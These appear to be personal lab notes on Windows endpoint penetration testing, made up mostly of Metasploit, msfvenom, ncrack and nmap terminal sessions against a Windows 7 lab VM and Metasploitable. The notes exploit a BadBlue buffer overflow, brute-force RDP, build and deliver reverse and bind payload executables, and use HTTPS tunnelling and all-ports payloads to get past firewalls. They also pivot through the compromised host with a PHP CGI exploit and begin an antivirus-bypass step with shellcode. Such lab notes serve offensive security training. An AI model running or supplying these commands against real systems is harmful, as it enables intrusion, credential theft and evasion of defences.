Windows Endpoint Pentesting

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Sofware Based Vulnerabilites

https://www.exploit-db.com/exploits/16806/
BadBlue 2.72b

In Kali
msf > search Badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49242) at 2017-03-01 11:17:09 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getpid
Current pid: 2872
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0
 280   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 324   656   WmiPrvSE.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 380   364   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 432   364   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 440   424   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 488   432   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 512   432   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 520   432   lsm.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 532   424   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 656   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 724   488   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 740   488   dllhost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
 756   488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 808   488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 896   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 972   488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 1144  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1264  488   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1360  488   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1396  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1456  488   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1508  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1600  488   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1664  488   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1860  488   TPAutoConnSvc.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 1940  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2132  488   taskhost.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\system32\taskhost.exe
 2204  896   dwm.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\Dwm.exe
 2228  2196  explorer.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\Explorer.EXE
 2292  488   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2340  2228  vmtoolsd.exe       x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2704  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2720  1860  TPAutoConnect.exe  x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2728  440   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2756  488   SearchIndexer.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
 2856  488   wmpnetwk.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
 2872  1840  badblue.exe        x86   1        ABCD-PC\ABCD                  C:\Program Files\BadBlue\EE\BadBlue.exe
 3168  488   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3468  2228  cmd.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\cmd.exe

meterpreter > migrate 2228
[*] Migrating from 2872 to 2228...
[*] Migration completed successfully.
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

RDP Misconfiguration

In Windows 7
Enable RDP
Control Panel -> System and Security -> System -> Remote Settings -> Allow connections from computers running any version of Remote Desktop (less secure)

In Kali
$ nmap -sV -p3389 -n 192.168.1.14

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-01 11:20 EST
Nmap scan report for 192.168.1.14
Host is up (0.00042s latency).
PORT     STATE    SERVICE       VERSION
3389/tcp filtered ms-wbt-server
MAC Address: 00:0C:29:4D:B8:A9 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

$ ncrack -U rdp_user_list -P rdp_pass_list -p rdp 192.168.1.14

Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-03-01 11:23 EST

Discovered credentials for rdp on 192.168.1.14 3389/tcp:
192.168.1.14 3389/tcp rdp: 'ABCD' 'Ab12345'

Ncrack done: 1 service scanned in 6.00 seconds.

Ncrack finished.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Social Engineering

Bind Connect

In Kali
$ msfvenom -p windows/meterpreter_bind_tcp -a x86 -f exe > Bind_Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 957999 bytes
Final size of exe file: 1033216 bytes
$ file Bind_Payload.exe
Bind_Payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:30] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:39:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:39:32] "GET /Bind_Payload.exe HTTP/1.1" 200 -

In Windows 7
In Browser
https://192.168.1.13:8000
Run Bind_Payload.exe
C:\Users\ABCD>netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:49389        ABCD-PC:49390          ESTABLISHED
  TCP    127.0.0.1:49390        ABCD-PC:49389          ESTABLISHED
  TCP    192.168.1.14:4444      192.168.1.13:35761     ESTABLISHED

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(handler) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(handler) > exploit

[*] Started bind handler
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:35761 -> 192.168.1.14:4444) at 2017-03-01 11:43:50 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Bypass Firewall

Reverse Connect - Reliable

In Kali
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -a x86 -f exe > Reverse_Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
$ file Reverse_Payload.exe
Reverse_Payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 11:56:54] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 11:56:54] code 404, message File not found
192.168.1.14 - - [01/Mar/2017 11:56:54] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.14 - - [01/Mar/2017 11:56:57] "GET /Reverse_Payload.exe HTTP/1.1" 200 -

In Windows 7
In Browser
http://192.168.1.13:8000/
Run Reverse_Payload.exe

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49248) at 2017-03-01 11:59:06 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Bypass Firewall

Port 80 / 443 are open
Rest all are closed

https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication
HTTPS Tunneling
HTTP Tunneling

In Windows 7
Control Panel\System and Security\Windows Firewall
Advanced Settings -> Outbound Rules -> New Rule -> Port -> Next -> 4444 -> Block the connection -> Block Reverse TCP Payload -> Finish

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.1.13:8443
[*] Starting the payload handler...
[*] https://192.168.1.13:8443 handling request from 192.168.1.14; (UUID: ztzerbnw) Staging Native payload...
[*] Meterpreter session 1 opened (192.168.1.13:8443 -> 192.168.1.14:49186) at 2017-03-01 12:35:51 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 192.168.1.14 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Automatic Outbound Open Port Detection

Unaware of the open ports on a windows machine
Solution
Payload that systematically tries to connect to each port from 1 - 65535 and connect back to the attacker

http://superuser.com/questions/440324/iptables-how-to-forward-all-external-ports-to-one-local-port

In Windows 7
Control Panel\System and Security\Windows Firewall
Advanced Settings -> Outbound Rules -> New Rule -> Port -> Next -> 4444-6009 -> Block the connection -> Block range of Ports -> Finish

In Kali
$ msfvenom -p windows/meterpreter/reverse_tcp_allports LHOST=192.168.1.13 LPORT=4444 -a x86 -f exe > Reverse_All.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 282 bytes
Final size of exe file: 73802 bytes
$ file Reverse_All.exe
Reverse_All.exe: PE32 executable (GUI) Intel 80386, for MS Windows
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.1.14 - - [01/Mar/2017 13:45:20] "GET / HTTP/1.1" 200 -
192.168.1.14 - - [01/Mar/2017 13:45:22] "GET /Reverse_All.exe HTTP/1.1" 200 -
$ iptables --flush
$ iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 4444:6010 -j DNAT --to-destination 192.168.1.13:4444

In Windows 7
In Browser
http://192.168.1.13:8000/
Run Reverse_All.exe

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp_allports
PAYLOAD => windows/meterpreter/reverse_tcp_allports
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp_allports):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     1                yes       The starting port number to connect back on


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > set LPORT 4444
LPORT => 4444
exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49239) at 2017-03-01 13:46:49 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >

In Windows 7
$ netstat -an
Active Connections

  Proto  Local Address          Foreign Address        State
  <snip>
  TCP    192.168.1.14:139       0.0.0.0:0              LISTENING
  TCP    192.168.1.14:49239     192.168.1.13:6010      ESTABLISHED
  TCP    [::]:135               [::]:0                 LISTENING
  <snip>

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Port Forwarding

Attacker cannot directly access Metasploitable but has meterpreter session on Windows 7

Attacker ---- Firewall ---- Windows 7
                              |
                              |
                              |
                          Metasploitable

$ nmap -sV -n 192.168.1.14

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-01 14:12 EST
Nmap scan report for 192.168.1.14
Host is up (0.00050s latency).
Not shown: 991 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         BadBlue httpd 2.7
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
10243/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 00:0C:29:4D:B8:A9 (VMware)
Service Info: Host: ABCD-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.87 seconds

$ msf > search badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49181) at 2017-03-01 14:16:59 -0500

meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 296   512   dllhost.exe
 360   348   csrss.exe
 412   348   wininit.exe
 420   404   csrss.exe
 468   404   winlogon.exe
 512   412   services.exe
 520   412   lsass.exe
 528   412   lsm.exe
 636   512   svchost.exe
 696   512   vmacthlp.exe
 740   512   svchost.exe
 860   512   svchost.exe
 916   512   svchost.exe
 960   512   svchost.exe
 1016  860   audiodg.exe             x86   0
 1120  512   svchost.exe
 1252  512   svchost.exe
 1344  512   spoolsv.exe
 1380  512   svchost.exe
 1484  512   svchost.exe
 1512  512   svchost.exe
 1560  512   sppsvc.exe
 1660  512   VGAuthService.exe
 1684  512   vmtoolsd.exe
 1888  512   TPAutoConnSvc.exe
 1980  512   dllhost.exe
 2024  512   msdtc.exe
 2036  636   WmiPrvSE.exe
 2200  512   taskhost.exe            x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2284  1888  TPAutoConnect.exe       x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2300  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2344  916   dwm.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2360  2328  explorer.exe            x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2436  512   VSSVC.exe
 2500  2360  vmtoolsd.exe            x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2744  512   SearchIndexer.exe
 2860  512   wmpnetwk.exe
 2976  2744  SearchProtocolHost.exe  x86   1        ABCD-PC\ABCD  C:\Windows\system32\SearchProtocolHost.exe
 2996  2744  SearchFilterHost.exe
 3044  2744  SearchProtocolHost.exe
 3156  512   svchost.exe
 3268  636   dllhost.exe             x86   1
 3296  636   WmiPrvSE.exe
 3500  512   svchost.exe
 3536  2360  badblue.exe             x86   1        ABCD-PC\ABCD  C:\Program Files\BadBlue\EE\badblue.exe
 3596  512   WmiApSrv.exe

meterpreter > migrate 2360
[*] Migrating from 3536 to 2360...
[*] Migration completed successfully.
meterpreter > ipconfig
-----------A new adaptor will be present here with a new IP-----------
Eg IP -> 112.112.112.10
meterpreter > run apr_scanner -r <IP_Address Range of the adaptor>
meterpreter > run apr_scanner -r 112.112.112.1-255
Inspect port 80 of metasploitable via Windows 7
meterpreter > portfwd add -l 8000 -p 80 -r 112.112.112.20
"112.112.112.20" new host enumerated using apr_scanner

$ nmap -sV -n -p 8000 localhost
In Browser
localhost:8000

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Pivoting - Bind Shell

meterpreter > background
msf exploit(badblue_passthru) > search php_cgi_arg
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                      Disclosure Date  Rank       Description
   ----                                      ---------------  ----       -----------
   exploit/multi/http/php_cgi_arg_injection  2012-05-03       excellent  PHP CGI Argument Injection

msf exploit(badblue_passthru) > sessions -l
msf exploit(badblue_passthru) > route add 112.112.112.1 255.255 255.0 1
Where 1 is the session number and the IP is the gateway
msf exploit(badblue_passthru) > use exploit/multi/http/php_cgi_arg_injection
msf exploit(php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(php_cgi_arg_injection) > set RHOST 112.112.112.20
msf exploit(php_cgi_arg_injection) > set PAYLOAD php/meterpreter/bind_tcp
msf exploit(php_cgi_arg_injection) > exploit
meterpreter > sysinfo

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Pivoting - Reverse Shell

$ msf > search badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49181) at 2017-03-01 14:16:59 -0500

meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 296   512   dllhost.exe
 360   348   csrss.exe
 412   348   wininit.exe
 420   404   csrss.exe
 468   404   winlogon.exe
 512   412   services.exe
 520   412   lsass.exe
 528   412   lsm.exe
 636   512   svchost.exe
 696   512   vmacthlp.exe
 740   512   svchost.exe
 860   512   svchost.exe
 916   512   svchost.exe
 960   512   svchost.exe
 1016  860   audiodg.exe             x86   0
 1120  512   svchost.exe
 1252  512   svchost.exe
 1344  512   spoolsv.exe
 1380  512   svchost.exe
 1484  512   svchost.exe
 1512  512   svchost.exe
 1560  512   sppsvc.exe
 1660  512   VGAuthService.exe
 1684  512   vmtoolsd.exe
 1888  512   TPAutoConnSvc.exe
 1980  512   dllhost.exe
 2024  512   msdtc.exe
 2036  636   WmiPrvSE.exe
 2200  512   taskhost.exe            x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2284  1888  TPAutoConnect.exe       x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2300  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2344  916   dwm.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2360  2328  explorer.exe            x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2436  512   VSSVC.exe
 2500  2360  vmtoolsd.exe            x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2744  512   SearchIndexer.exe
 2860  512   wmpnetwk.exe
 2976  2744  SearchProtocolHost.exe  x86   1        ABCD-PC\ABCD  C:\Windows\system32\SearchProtocolHost.exe
 2996  2744  SearchFilterHost.exe
 3044  2744  SearchProtocolHost.exe
 3156  512   svchost.exe
 3268  636   dllhost.exe             x86   1
 3296  636   WmiPrvSE.exe
 3500  512   svchost.exe
 3536  2360  badblue.exe             x86   1        ABCD-PC\ABCD  C:\Program Files\BadBlue\EE\badblue.exe
 3596  512   WmiApSrv.exe

meterpreter > migrate 2360
[*] Migrating from 3536 to 2360...
[*] Migration completed successfully.
meterpreter > ipconfig
-----------A new adaptor will be present here with a new IP-----------
Eg IP -> 112.112.112.10
meterpreter > background
msf exploit(badblue_passthru) > route add 112.112.112.1 255.255 255.0 1
Where 1 is the session number and the IP is the gateway
msf exploit(badblue_passthru) > use exploit/multi/http/php_cgi_arg_injection
msf exploit(php_cgi_arg_injection) > show options

Module options (exploit/multi/http/php_cgi_arg_injection):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   PLESK        false            yes       Exploit Plesk
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                         yes       The target address
   RPORT        80               yes       The target port
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                     no        The URI to request (must be a CGI-handled PHP script)
   URIENCODING  0                yes       Level of URI URIENCODING and padding (0 for minimum)
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(php_cgi_arg_injection) > set RHOST 112.112.112.20   ------> Metasploitable IP address
msf exploit(php_cgi_arg_injection) > set PAYLOAD php/meterpreter/reverse_tcp
msf exploit(php_cgi_arg_injection) > set LHOST 112.112.112.10   ------> Windows 7 IP address facing Metasploitable
msf exploit(php_cgi_arg_injection) > exploit
meterpreter > sysinfo

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

AV Bypass using Python

In Kali
Generate the shellcode and replace it in avbypass.py
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -a x86 -f c

In Windows 7
C:\Python27\Scripts>pip install pyinstaller
Collecting pyinstaller
  Downloading PyInstaller-3.2.1.tar.bz2 (2.4MB)
    100% |################################| 2.4MB 364kB/s
Requirement already satisfied: setuptools in c:\python27\lib\site-packages (from
 pyinstaller)
Collecting future (from pyinstaller)
  Downloading future-0.16.0.tar.gz (824kB)
    100% |################################| 829kB 726kB/s
Collecting pypiwin32 (from pyinstaller)
  Downloading pypiwin32-219-cp27-none-win32.whl (6.7MB)
    100% |################################| 6.7MB 136kB/s
Installing collected packages: future, pypiwin32, pyinstaller
  Running setup.py install for future ... done
  Running setup.py install for pyinstaller ... done
Successfully installed future-0.16.0 pyinstaller-3.2.1 pypiwin32-219

C:\Python27\Scripts>pyinstaller.exe -w -a -F C:\Users\ABCD\Desktop\avbypass.py
326 INFO: PyInstaller: 3.2.1
326 INFO: Python: 2.7.13
326 INFO: Platform: Windows-7-6.1.7600-SP0
326 INFO: wrote C:\Python27\Scripts\avbypass.spec
326 INFO: UPX is not available.
342 INFO: Extending PYTHONPATH with paths
['C:\\Users\\ABCD\\Desktop', 'C:\\Python27\\Scripts']
